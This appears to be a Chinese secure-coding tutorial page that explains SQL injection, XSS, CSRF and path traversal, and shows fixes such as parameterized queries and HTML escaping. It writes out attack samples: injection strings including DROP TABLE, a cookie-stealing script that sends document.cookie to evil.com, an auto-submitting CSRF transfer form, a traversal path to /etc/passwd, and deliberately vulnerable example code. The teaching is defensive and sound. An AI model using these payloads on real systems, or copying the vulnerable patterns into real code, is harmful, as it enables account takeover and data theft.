---
id: security-coding
title: 安全编程实践
summary: 安全编程（Secure Coding）是编写不易受攻击的代码——输入验证、输出编码、最小权限、纵深防御是四条基本原则
difficulty: advanced
order: 13
parent: software-lifecycle
children:
  - performance-tuning
related: []
prerequisites:
  - software-lifecycle
tags:
  - software-eng
  - security
  - secure-coding
createdAt: 2026-06-12
updatedAt: 2026-06-13
---

## 🔒 你的代码可能是"漏洞百出"的

你写了一个留言板功能——用户输入昵称和留言，保存到数据库，展示在页面上。

看起来很简单？但你写的这几十行代码，可能包含了 Web 安全领域**最经典的两个漏洞**。

> 📖 **类比：宿舍防盗"
>
> 你住在宿舍一楼。你觉得锁了门就安全了——但小偷可能从窗户爬进来（另一个漏洞）、或者冒充室友骗开门（社会工程学）、或者门锁本身质量太差（技术漏洞）。
>
> 安全编程的思维就是：**站在攻击者的角度想——"如果我是一个坏蛋，我能怎么搞这个系统？"**

---

## ❌ 漏洞 1：SQL 注入——最常见的漏洞

### 问题在哪

```python
# ❌ 危险代码——字符串拼接 SQL
def get_user(username):
    query = f"SELECT * FROM users WHERE name = '{username}'"
    cursor.execute(query)
    
# 正常输入：get_user("张三")
# → SELECT * FROM users WHERE name = '张三' ✅

# 恶意输入：get_user("' OR '1'='1")
# → SELECT * FROM users WHERE name = '' OR '1'='1'
# → 返回所有用户！（'1'='1' 永远为真）
```

攻击者输入 `' OR '1'='1` ——你的 SQL 变成了"返回所有用户"。如果是个登录框——攻击者可以**不输入密码就登录任何账号**。

更危险的攻击：

```python
# 恶意输入："'; DROP TABLE users; --"
# → SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
# → 删库跑路！
```

### 修复：参数化查询

```python
# ✅ 安全——用参数化查询，永远不拼接字符串
def get_user(username):
    query = "SELECT * FROM users WHERE name = %s"
    cursor.execute(query, (username,))  # 参数作为数据传递，不会被当作 SQL 执行

# 即使用户输入 "' OR '1'='1"
# 数据库把它当作"一个字符串值"而不是"SQL 语句的一部分"
# → 相当于：SELECT * FROM users WHERE name = "' OR '1'='1"
# → 安全！只会找名字叫这个的用户（不存在）
```

**规则**：**永远不要拼接用户输入到 SQL 中。** 用参数化查询（Prepared Statement）或 ORM。

---

## ❌ 漏洞 2：XSS（跨站脚本攻击）

### 问题在哪

```python
# ❌ 危险代码——直接把用户输入输出到页面
def display_comment(request):
    username = request.GET.get("username")
    comment = request.GET.get("comment")
    
    # 直接拼接 HTML
    html = f"<p>{username}: {comment}</p>"
    return html
```

攻击者提交：

```html
<script>alert('你被黑了！');</script>
```

访问页面的人会看到弹窗——更严重的是：

```html
<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

**攻击者可以窃取所有访问这个页面用户的 Cookie，伪装成他们登录。**

### 修复：输出编码

```python
# ✅ 安全——对用户输入进行 HTML 转义
import html

def display_comment(request):
    username = request.GET.get("username")
    comment = request.GET.get("comment")
    
    # 转义特殊字符
    safe_username = html.escape(username)
    safe_comment = html.escape(comment)
    
    html = f"<p>{safe_username}: {safe_comment}</p>"
    # <script> → &lt;script&gt; → 浏览器不把它当代码执行
    return html
```

**规则**：**永远不要直接把用户输入输出到页面。** 任何用户输入在输出到 HTML 之前，必须经过编码转义。

---

## ⚔️ 其他常见漏洞

### CSRF（跨站请求伪造）

用户登录了银行网站（有 Cookie）。然后访问了另一个恶意网站——这个网站里藏了一个表单：

```html
<!-- 恶意网站中的隐藏表单 -->
<form action="https://bank.com/transfer" method="POST" id="hack">
    <input type="hidden" name="to" value="攻击者账号">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('hack').submit();</script>
```

如果用户还没登出银行网站——恶意表单的请求会**自动带上银行网站的 Cookie**！银行服务器以为是"用户自己"发起的转账。

**防御**：在表单中使用 CSRF Token——每次请求带一个随机生成的 Token，服务器验证。恶意网站无法获取这个 Token。

### 路径遍历

```python
# ❌ 危险代码
def get_file(filename):
    path = "/var/www/files/" + filename
    with open(path) as f:
        return f.read()

# 攻击者输入：../../etc/passwd
# 访问了系统密码文件！
```

**防御**：白名单验证、或限制路径到指定目录。

```python
import os

def safe_get_file(filename):
    # 白名单：只允许某些文件
    allowed = {"report.pdf", "photo.jpg"}
    if filename not in allowed:
        raise ValueError("不允许访问的文件")
    
    path = os.path.join("/var/www/files/", filename)
    return open(path).read()
```

---

## 🛡️ 安全编程的四大原则

### ① 最小权限原则

> **只给完成工作所必须的最小权限。**

```
❌ 数据库连接用 root 账号（有 DROP TABLE 权限）
✅ 用只读账号（只能 SELECT）——即使用户输入注入了，也不能删表

❌ 服务以 root 权限运行（能修改系统文件）
✅ 用普通用户运行——只能访问自己的文件
```

### ② 纵深防御

> **不依赖单层防御——多层防护叠加。**

```python
# 一层防线不够——攻破一层还有下一层
def process_login(username, password):
    # 第 1 层：输入验证
    if not re.match(r"^[a-zA-Z0-9_]+$", username):
        return "用户名格式错误"
    
    # 第 2 层：参数化查询（防 SQL 注入）
    user = db.execute("SELECT * FROM users WHERE name=%s", (username,))
    
    # 第 3 层：密码加密存储（数据库被拖走也不怕）
    if check_password(password, user.hashed_password):
        return "登录成功"
    
    # 第 4 层：限流——防止暴力破解
```

### ③ 永不信任用户输入

> **所有用户输入都是"邪恶的"，直到被证明是安全的。**

```python
def process_input(data):
    # 验证：是不是合法的格式？
    if not isinstance(data, str):
        return "类型错误"
    if len(data) > 100:
        return "太长"
    if not re.match(r"^[一-龥a-zA-Z0-9]+$", data):
        return "包含非法字符"
    
    # 过滤：移除危险内容
    data = html.escape(data)
    
    # 转换：确保后续处理安全
    return data
```

### ④ HTTPS 加密传输

> **HTTP 传输是明文的——任何人都可以窃听。**

```python
# HTTP 明文传输：
# 你在咖啡厅连公共 WiFi → 登录网站 → 密码在 WiFi 中是明文传输的
# 同 WiFi 的人可以用工具直接看到你的密码

# HTTPS 加密传输：
# 所有数据加密——WiFi 中的人看到的是一堆乱码

# 配置方式：
# 1. 购买 SSL/TLS 证书（或 Let's Encrypt 免费证书）
# 2. 配置 Web 服务器使用 HTTPS
# 3. 强制所有 HTTP 请求重定向到 HTTPS
```

---

## 📝 小结

| 漏洞/原则 | 一句话 |
|:----------:|--------|
| **SQL 注入** | 拼接用户输入到 SQL——用参数化查询防御 |
| **XSS** | 用户输入直接输出到页面——用 HTML 转义防御 |
| **CSRF** | 伪造用户请求——用 CSRF Token 防御 |
| **路径遍历** | 访问不该访问的文件——用白名单防御 |
| **最小权限** | 只给刚好的权限——别用 root 连数据库 |
| **纵深防御** | 多层防护——攻破一层还有下一层 |
| **永不信任输入** | 所有用户输入都是潜在的恶意数据 |
| **HTTPS** | 加密传输——防止中间人窃听 |

> 🎯 **小练习**：审查下面的代码——找出所有安全漏洞，并逐行修复：
> ```python
> from flask import Flask, request
> app = Flask(__name__)
> 
> @app.route('/search')
> def search():
>     name = request.args.get('name')
>     query = f"SELECT * FROM users WHERE name = '{name}'"
>     results = db.execute(query)
>     html = f"<p>搜索结果：{name}</p>"
>     return html
> ```

**为什么先学这个？** 安全之后，最后一个主题——[[performance-tuning|性能分析与调优]]。
